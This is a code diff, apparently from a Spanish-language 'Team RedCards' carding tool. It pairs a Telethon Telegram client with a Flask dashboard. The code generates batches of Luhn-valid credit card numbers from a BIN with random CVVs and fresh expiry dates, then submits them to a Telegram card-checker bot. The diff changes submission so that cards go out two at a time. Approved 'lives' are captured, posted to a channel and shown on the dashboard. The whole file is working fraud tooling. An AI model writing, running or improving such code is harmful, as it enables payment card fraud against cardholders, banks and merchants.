@@ -61,27 +61,23 @@ def is_date_valid(month, year):
         month = int(month)
         year = int(year)
         
-        # Convertir a año completo (00-30 = 2000-2030, 31-99 = 1931-1999)
         if year <= 30:
             year += 2000
         elif year <= 99:
             year += 1900
         
-        # Crear fecha del último día del mes
         if month == 12:
             expiry_date = datetime(year + 1, 1, 1) - timedelta(days=1)
         else:
             expiry_date = datetime(year, month + 1, 1) - timedelta(days=1)
         
-        # Comparar con fecha actual
         return expiry_date >= datetime.now()
     except:
         return False
 
 def generate_random_valid_date():
-    """Genera una fecha aleatoria válida (actual o más adelante)"""
+    """Genera una fecha aleatoria válida"""
     now = datetime.now()
-    # Generar fecha entre hoy y 5 años en el futuro
     days_ahead = random.randint(0, 365 * 5)
     future_date = now + timedelta(days=days_ahead)
     month = f"{future_date.month:02d}"
@@ -89,90 +85,68 @@ def generate_random_valid_date():
     return month, year
 
 def generate_cc_variants(ccbase, count=20):
-    """
-    Genera 20 variantes de tarjetas CON algoritmo de Luhn
-    - Si la fecha es vencida: genera nueva fecha válida y quita últimos 6 dígitos
-    - Si la fecha es válida: cambia solo los 4 últimos dígitos
-    """
-    # Detectar separador (coma o pipe)
+    """Genera 20 variantes de tarjetas con Luhn"""
     if ',' in ccbase:
         separator = ','
     elif '|' in ccbase:
         separator = '|'
     else:
-        log_messages.append(f"ERROR: Formato desconocido: {ccbase}")
+        log_messages.append(f"❌ Formato desconocido: {ccbase}")
         return []
     
     parts = ccbase.strip().split(separator)
     
-    # Parsear datos originales
     if len(parts) >= 4:
         cardnumber = parts[0]
         month = parts[1]
         year = parts[2]
         cvv = parts[3]
     else:
-        log_messages.append(f"ERROR: Formato de CC inválido: {ccbase}")
+        log_messages.append(f"❌ Formato inválido: {ccbase}")
         return []
     
-    # Verificar longitud de tarjeta
     if len(cardnumber) < 12:
-        log_messages.append(f"ERROR: Tarjeta muy corta: {cardnumber}")
+        log_messages.append(f"❌ Tarjeta muy corta: {cardnumber}")
         return []
     
-    # Verificar si la fecha es válida
     date_is_valid = is_date_valid(month, year)
-    
     variants = []
     
-    # Si la fecha NO es válida (vencida)
     if not date_is_valid:
-        log_messages.append(f"⚠️ Fecha vencida detectada: {month}/{year}. Generando nueva fecha...")
+        log_messages.append(f"⚠️ Scrapper - Fecha vencida: {month}/{year}")
         month, year = generate_random_valid_date()
+        log_messages.append(f"⚠️ Scrapper - Fecha actualizada: {month}/{year}")
         
-        # Generar 20 variantes CAMBIANDO los últimos 6 dígitos con Luhn
-        bin_number = cardnumber[:-6]  # Primeros dígitos (BIN + números fijos)
+        bin_number = cardnumber[:-6]
         
         for i in range(count):
-            # Generar 5 dígitos aleatorios
             random_digits = ''.join([str(random.randint(0, 9)) for _ in range(5)])
             partial = bin_number + random_digits
-            
-            # Calcular dígito de Luhn
             luhn_digit = generate_luhn_digit(partial)
             complete_number = partial + str(luhn_digit)
-            
-            # Generar CVV aleatorio
             random_cvv = random.randint(100, 999)
             variant = f"{complete_number}{separator}{month}{separator}{year}{separator}{random_cvv}"
             
             if variant not in variants:
                 variants.append(variant)
         
-        log_messages.append(f"✓ Generadas {len(variants)} CCs con Luhn + fecha actualizada")
+        log_messages.append(f"✅ Generadas 20 CCs (Luhn + fecha actualizada)")
     
-    # Si la fecha SÍ es válida
     else:
-        bin_number = cardnumber[:-4]  # Quitar los 4 últimos dígitos
+        bin_number = cardnumber[:-4]
         
-        # Generar 20 variantes cambiando los 4 últimos dígitos con Luhn
         for i in range(count):
-            # Generar 3 dígitos aleatorios
             random_digits = ''.join([str(random.randint(0, 9)) for _ in range(3)])
             partial = bin_number + random_digits
-            
-            # Calcular dígito de Luhn
             luhn_digit = generate_luhn_digit(partial)
             complete_number = partial + str(luhn_digit)
-            
-            # Generar CVV aleatorio
             random_cvv = random.randint(100, 999)
             variant = f"{complete_number}{separator}{month}{separator}{year}{separator}{random_cvv}"
             
             if variant not in variants:
                 variants.append(variant)
         
-        log_messages.append(f"✓ Generadas {len(variants)} variantes con Luhn válido")
+        log_messages.append(f"✅ Generadas 20 CCs (Luhn válido)")
     
     return variants
 
@@ -185,12 +159,9 @@ async def response_handler(event):
     full_message = event.message.message if event.message.message else ""
     message_lower = full_message.lower()
     
-    # Detectar si es APPROVED
     if "✅" in full_message or "approved" in message_lower:
         approved_count += 1
-        log_messages.append(f"✓ APPROVED: {full_message[:100]}")
         
-        # Extraer información del mensaje
         lines = full_message.split('\n')
         cc_number = status = response = country = bank = card_type = gate = ""
         
@@ -210,7 +181,8 @@ async def response_handler(event):
             elif 'gate:' in line.lower():
                 gate = line.split(':', 1)[1].strip() if len(line.split(':', 1)) > 1 else ""
         
-        # ✅ NUEVO FORMATO - Team RedCards (MEJORADO Y BRUTAL)
+        log_messages.append(f"✅ LIVE ENCONTRADA: {cc_number[:12]}... | {status}")
+        
         formatted_message = f"""╔════════════════════════════════════════╗
            Team RedCards 💳
 ╚════════════════════════════════════════╝
@@ -225,7 +197,6 @@ async def response_handler(event):
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 💵 GATE: {gate}"""
         
-        # Guardar LIVE en la lista
         live_entry = {
             "cc": cc_number,
             "status": status,
@@ -237,15 +208,12 @@ async def response_handler(event):
         }
         lives_list.append(live_entry)
         
-        # Mantener solo los últimos 100 lives
         if len(lives_list) > 100:
             lives_list.pop(0)
         
-        # ENVIAR AL CANAL
         try:
             image_path = 'x1.jpg'
             
-            # Enviar con imagen si existe, si no, solo texto
             if os.path.exists(image_path):
                 await client.send_file(
                     channelid,
@@ -253,23 +221,20 @@ async def response_handler(event):
                     caption=formatted_message,
                     parse_mode='markdown'
                 )
-                log_messages.append(f"✓ Enviado al canal con imagen")
             else:
                 await client.send_message(
                     channelid,
                     formatted_message,
                     parse_mode='markdown'
                 )
-                log_messages.append(f"✓ Enviado al canal sin imagen")
         
         except Exception as e:
-            log_messages.append(f"ERROR al enviar: {e}")
+            log_messages.append(f"❌ Error: {e}")
     
     elif "❌" in full_message or "declined" in message_lower:
         declined_count += 1
-        log_messages.append(f"✗ DECLINED: {full_message[:100]}")
+        log_messages.append(f"❌ DECLINADA: {full_message[:50]}...")
     
-    # Mantener solo los últimos 100 logs
     if len(log_messages) > 100:
         log_messages.pop(0)
 
@@ -285,20 +250,15 @@ async def load_commands():
                     return cmds
         return ['/check', '/validate', '/test']
     except Exception as e:
-        log_messages.append(f"ERROR: Error cargando comandos: {e}")
+        log_messages.append(f"❌ Error cargando comandos: {e}")
         return ['/check']
 
 async def send_to_bot():
-    """
-    Envía CCs al bot de Telegram
-    - Genera 20 variantes por BIN con Luhn válido
-    - Si fecha vencida: genera nueva fecha y quita últimos 6 dígitos
-    - Si fecha válida: cambia solo los 4 últimos dígitos
-    """
+    """Envía CCs al bot - 2 simultáneamente"""
     while True:
         try:
             if not os.path.exists('ccs.txt'):
-                log_messages.append("INFO: ccs.txt no encontrado. Esperando...")
+                log_messages.append("⏳ Esperando ccs.txt...")
                 await asyncio.sleep(30)
                 continue
             
@@ -308,7 +268,6 @@ async def send_to_bot():
             if ccs_list:
                 current_cc = ccs_list[0].strip()
                 
-                # Eliminar la CC que se procesará
                 if len(ccs_list) > 1:
                     with open('ccs.txt', 'w', encoding='utf-8') as f:
                         f.writelines(ccs_list[1:])
@@ -316,56 +275,66 @@ async def send_to_bot():
                     with open('ccs.txt', 'w', encoding='utf-8') as f:
                         f.write("")
                 
-                log_messages.append(f"INFO: Generando 20 variantes para {current_cc[:12]}...")
+                log_messages.append(f"🔄 Scrapper - Generando 20 CCs del BIN: {current_cc[:12]}...")
                 
-                # GENERAR 20 VARIANTES CON LUHN
                 cc_variants = generate_cc_variants(current_cc, count=20)
                 
                 if not cc_variants:
-                    log_messages.append(f"ERROR: No se pudieron generar variantes")
+                    log_messages.append(f"❌ Error generando variantes")
                     await asyncio.sleep(20)
                     continue
                 
                 commands = await load_commands()
                 
-                # Enviar las 20 CCs generadas
-                for i, cc in enumerate(cc_variants):
-                    selected_command = random.choice(commands)
-                    message = f"{selected_command} {cc}"
+                # ENVIAR 2 SIMULTÁNEAMENTE
+                for i in range(0, len(cc_variants), 2):
+                    pair = cc_variants[i:i+2]
+                    tasks = []
                     
-                    try:
-                        await client.send_message('@Alphachekerbot', message)
-                        log_messages.append(f"✓ Enviado CC #{i+1}/20: {cc[:12]}...")
-                    except FloodWaitError as e:
-                        log_messages.append(f"WARNING: Esperando {e.seconds}s...")
-                        await asyncio.sleep(e.seconds)
-                    except RPCError as e:
-                        log_messages.append(f"ERROR RPC: {e}")
+                    for j, cc in enumerate(pair):
+                        selected_command = random.choice(commands)
+                        message = f"{selected_command} {cc}"
+                        
+                        async def send_cc(msg, idx):
+                            try:
+                                await client.send_message('@Alphachekerbot', msg)
+                                num = i + idx + 1
+                                log_messages.append(f"✓ Scrapper enviado #{num}/20: {msg[:20]}...")
+                            except FloodWaitError as e:
+                                log_messages.append(f"⏸️ Esperando {e.seconds}s...")
+                                await asyncio.sleep(e.seconds)
+                            except RPCError as e:
+                                log_messages.append(f"❌ Error: {e}")
+                        
+                        tasks.append(send_cc(message, j))
                     
+                    # Ejecutar ambas al mismo tiempo
+                    await asyncio.gather(*tasks)
+                    
+                    # Esperar entre lotes
                     await asyncio.sleep(21)
                 
-                log_messages.append(f"✓ Lote completado: 20/20 CCs enviadas")
+                log_messages.append(f"🎉 Scrapper - Lote completado: 20/20 CCs enviadas")
             else:
-                log_messages.append("INFO: No hay CCs. Esperando...")
+                log_messages.append("⏳ Sin CCs en cola...")
                 await asyncio.sleep(20)
         
         except Exception as e:
-            log_messages.append(f"ERROR: {e}")
+            log_messages.append(f"❌ Error: {e}")
             await asyncio.sleep(20)
 
 async def start_client():
     """Inicia el cliente de Telegram"""
     try:
-        log_messages.append("INFO: Iniciando cliente de Telegram...")
+        log_messages.append("🚀 Iniciando Scrapper...")
         await client.start()
-        log_messages.append("✓ Cliente autenticado correctamente")
+        log_messages.append("✅ Scrapper conectado correctamente")
         
-        # Escuchar mensajes EDITADOS del bot checker
         client.add_event_handler(response_handler, events.MessageEdited(chats='@Alphachekerbot'))
         
         await asyncio.gather(send_to_bot(), client.run_until_disconnected())
     except Exception as e:
-        log_messages.append(f"ERROR: Error al iniciar cliente: {e}")
+        log_messages.append(f"❌ Error: {e}")
 
 def telethon_thread_fn():
     """Ejecuta el cliente de Telegram en un hilo separado"""
@@ -474,51 +443,20 @@ def index():
                 color: #ff1414;
                 text-shadow: 0 0 15px rgba(255, 20, 20, 0.6);
             }
-            .control-panel {
-                background: linear-gradient(135deg, rgba(255, 20, 20, 0.1) 0%, rgba(139, 0, 0, 0.05) 100%);
-                padding: 30px;
-                border-radius: 15px;
-                margin-bottom: 30px;
-                border: 2px solid #ff1414;
-                box-shadow: 0 0 20px rgba(255, 20, 20, 0.3);
-                text-align: center;
-            }
-            .control-panel button {
-                padding: 15px 40px;
-                background: linear-gradient(135deg, #ff1414 0%, #cc0000 100%);
-                border: 2px solid #ffaa00;
-                border-radius: 10px;
-                color: white;
-                font-size: 1.1em;
-                font-weight: 900;
-                cursor: pointer;
-                transition: all 0.3s ease;
-                text-transform: uppercase;
-                letter-spacing: 1px;
-                box-shadow: 0 0 20px rgba(255, 20, 20, 0.5);
-            }
-            .control-panel button:hover {
-                transform: scale(1.1);
-                box-shadow: 0 0 40px rgba(255, 170, 0, 0.8), 0 0 20px rgba(255, 20, 20, 0.6);
-                border-color: #ff1414;
-            }
-            .control-panel button:active {
-                transform: scale(0.95);
-            }
             .main-content {
                 display: grid;
                 grid-template-columns: 1fr 1fr;
                 gap: 20px;
                 margin-bottom: 30px;
             }
-            .logs-section, .lives-section {
+            .scrapper-section, .lives-section {
                 background: linear-gradient(135deg, rgba(255, 20, 20, 0.08) 0%, rgba(139, 0, 0, 0.03) 100%);
                 padding: 25px;
                 border-radius: 15px;
                 border: 2px solid #ff1414;
                 box-shadow: 0 0 15px rgba(255, 20, 20, 0.2);
             }
-            .logs-section h2, .lives-section h2 {
+            .scrapper-section h2, .lives-section h2 {
                 margin-bottom: 20px;
                 color: #ffaa00;
                 font-size: 1.8em;
@@ -561,7 +499,7 @@ def index():
             .search-box button:hover {
                 box-shadow: 0 0 20px rgba(255, 170, 0, 0.6);
             }
-            .logs-container, .lives-container {
+            .scrapper-container, .lives-container {
                 background: rgba(0, 0, 0, 0.5);
                 padding: 15px;
                 border-radius: 10px;
@@ -572,22 +510,19 @@ def index():
                 line-height: 1.7;
             }
             .log-entry {
-                padding: 5px 0;
+                padding: 8px 0;
                 border-bottom: 1px solid rgba(255, 20, 20, 0.2);
             }
-            .log-entry.approved {
+            .log-entry.success {
                 color: #00ff00;
                 text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
             }
-            .log-entry.declined {
+            .log-entry.error {
                 color: #ff1414;
                 text-shadow: 0 0 10px rgba(255, 20, 20, 0.5);
             }
             .log-entry.info {
                 color: #ffaa00;
-            }
-            .log-entry.error {
-                color: #ff6b6b;
             }
             .log-entry.warning {
                 color: #ffd700;
@@ -621,99 +556,20 @@ def index():
                 margin: 5px 0;
                 padding-left: 5px;
             }
-            /* Scrollbar personalizado */
-            .logs-container::-webkit-scrollbar,
+            /* Scrollbar */
+            .scrapper-container::-webkit-scrollbar,
             .lives-container::-webkit-scrollbar {
                 width: 10px;
             }
-            .logs-container::-webkit-scrollbar-track,
+            .scrapper-container::-webkit-scrollbar-track,
             .lives-container::-webkit-scrollbar-track {
                 background: rgba(0, 0, 0, 0.3);
                 border-radius: 10px;
             }
-            .logs-container::-webkit-scrollbar-thumb,
+            .scrapper-container::-webkit-scrollbar-thumb,
             .lives-container::-webkit-scrollbar-thumb {
                 background: linear-gradient(135deg, #ff1414 0%, #ffaa00 100%);
                 border-radius: 10px;
-            }
-            .logs-container::-webkit-scrollbar-thumb:hover,
-            .lives-container::-webkit-scrollbar-thumb:hover {
-                background: linear-gradient(135deg, #ffaa00 0%, #ff1414 100%);
-            }
-            /* Modal de Beneficios */
-            .modal {
-                display: none;
-                position: fixed;
-                z-index: 1000;
-                left: 0;
-                top: 0;
-                width: 100%;
-                height: 100%;
-                background: rgba(0, 0, 0, 0.8);
-                animation: fadeIn 0.3s ease;
-            }
-            @keyframes fadeIn {
-                from { opacity: 0; }
-                to { opacity: 1; }
-            }
-            .modal-content {
-                background: linear-gradient(135deg, #1a1a3e 0%, #2d1b3d 100%);
-                margin: 5% auto;
-                padding: 40px;
-                border: 3px solid #ff1414;
-                border-radius: 20px;
-                width: 90%;
-                max-width: 700px;
-                box-shadow: 0 0 50px rgba(255, 20, 20, 0.6);
-                animation: slideIn 0.4s ease;
-            }
-            @keyframes slideIn {
-                from { transform: translateY(-50px); opacity: 0; }
-                to { transform: translateY(0); opacity: 1; }
-            }
-            .close {
-                color: #ffaa00;
-                float: right;
-                font-size: 2em;
-                font-weight: bold;
-                cursor: pointer;
-                transition: 0.2s;
-            }
-            .close:hover {
-                color: #ff1414;
-                transform: scale(1.2);
-            }
-            .modal h2 {
-                color: #ff1414;
-                margin-bottom: 20px;
-                font-size: 2.5em;
-                text-shadow: 0 0 15px rgba(255, 20, 20, 0.6);
-                letter-spacing: 1px;
-            }
-            .benefits-list {
-                list-style: none;
-            }
-            .benefits-list li {
-                background: linear-gradient(135deg, rgba(255, 170, 0, 0.1) 0%, rgba(255, 20, 20, 0.05) 100%);
-                padding: 15px;
-                margin-bottom: 12px;
-                border-left: 4px solid #ffaa00;
-                border-radius: 8px;
-                color: #ffaa00;
-                font-size: 1.1em;
-                transition: all 0.2s ease;
-            }
-            .benefits-list li:hover {
-                transform: translateX(10px);
-                box-shadow: 0 0 15px rgba(255, 170, 0, 0.3);
-                border-left: 4px solid #ff1414;
-                color: #ff1414;
-            }
-            .benefits-list li::before {
-                content: '⚡ ';
-                color: #ff1414;
-                font-weight: bold;
-                margin-right: 8px;
             }
             @media (max-width: 1200px) {
                 .main-content {
@@ -739,19 +595,15 @@ def index():
                     <div class="number" id="declined">{{ declined }}</div>
                 </div>
                 <div class="stat-box">
-                    <h3>💰 SOCIOS</h3>
+                    <h3>💎 ENCONTRADAS</h3>
                     <div class="number" id="lives-count">0</div>
                 </div>
             </div>
             
-            <div class="control-panel">
-                <button onclick="openBenefits()">🎁 BENEFICIOS SOCIOS 🎁</button>
-            </div>
-            
             <div class="main-content">
-                <div class="logs-section">
-                    <h2>⚙️ ACTIVIDAD EN VIVO</h2>
-                    <div class="logs-container" id="logs">
+                <div class="scrapper-section">
+                    <h2>🔄 SCRAPPER</h2>
+                    <div class="scrapper-container" id="scrapper">
                         {{ log }}
                     </div>
                 </div>
@@ -769,43 +621,8 @@ def index():
             </div>
         </div>
         
-        <!-- Modal de Beneficios -->
-        <div id="benefitsModal" class="modal">
-            <div class="modal-content">
-                <span class="close" onclick="closeBenefits()">&times;</span>
-                <h2>🌟 BENEFICIOS SOCIOS 🌟</h2>
-                <ul class="benefits-list">
-                    <li>Acceso 24/7 a verificador élite</li>
-                    <li>Prioridad en procesamiento de tarjetas</li>
-                    <li>Soporte técnico dedicado</li>
-                    <li>Bases de datos actualizadas en tiempo real</li>
-                    <li>Ganancias exclusivas 5x más rápido</li>
-                    <li>Herramientas premium desbloqueadas</li>
-                    <li>Estadísticas avanzadas y reportes detallados</li>
-                    <li>Comunidad VIP privada</li>
-                    <li>Actualizaciones y mejoras prioritarias</li>
-                    <li>Garantía de satisfacción 100%</li>
-                </ul>
-            </div>
-        </div>
-        
         <script>
             let isSearching = false;
-            
-            function openBenefits() {
-                document.getElementById('benefitsModal').style.display = 'block';
-            }
-            
-            function closeBenefits() {
-                document.getElementById('benefitsModal').style.display = 'none';
-            }
-            
-            window.onclick = function(event) {
-                const modal = document.getElementById('benefitsModal');
-                if (event.target === modal) {
-                    modal.style.display = 'none';
-                }
-            }
             
             function displayLives(lives, filterText = '') {
                 const livesContainer = document.getElementById('lives');
@@ -860,14 +677,13 @@ def index():
                 fetch('/get_logs')
                     .then(response => response.json())
                     .then(data => {
-                        document.getElementById('logs').innerHTML = data.log
+                        document.getElementById('scrapper').innerHTML = data.log
                             .split('\\n')
                             .map(line => {
                                 let className = 'info';
-                                if (line.includes('✓') || line.includes('APPROVED')) className = 'approved';
-                                else if (line.includes('✗') || line.includes('DECLINED')) className = 'declined';
-                                else if (line.includes('ERROR')) className = 'error';
-                                else if (line.includes('WARNING') || line.includes('⚠️')) className = 'warning';
+                                if (line.includes('✓') || line.includes('✅')) className = 'success';
+                                else if (line.includes('❌') || line.includes('Error')) className = 'error';
+                                else if (line.includes('⚠️') || line.includes('⏸️')) className = 'warning';
                                 return `<div class="log-entry ${className}">${line}</div>`;
                             })
                             .join('');
@@ -875,8 +691,8 @@ def index():
                         document.getElementById('approved').textContent = data.approved;
                         document.getElementById('declined').textContent = data.declined;
                         
-                        const logsContainer = document.getElementById('logs');
-                        logsContainer.scrollTop = logsContainer.scrollHeight;
+                        const scrapper = document.getElementById('scrapper');
+                        scrapper.scrollTop = scrapper.scrollHeight;
                     });
                 
                 if (!isSearching) {
@@ -886,8 +702,8 @@ def index():
                             document.getElementById('lives-count').textContent = data.lives.length;
                             displayLives(data.lives);
                             
-                            const livesContainer = document.getElementById('lives');
-                            livesContainer.scrollTop = livesContainer.scrollHeight;
+                            const lives = document.getElementById('lives');
+                            lives.scrollTop = lives.scrollHeight;
                         });
                 }
             }
@@ -930,10 +746,8 @@ def health():
 # ============ INICIO ============
 
 if __name__ == '__main__':
-    # Iniciar Telethon en hilo separado
     telethon_thread = threading.Thread(target=telethon_thread_fn, daemon=True)
     telethon_thread.start()
     time.sleep(2)
     
-    # Iniciar Flask
     app.run('0.0.0.0', PORT, debug=False)
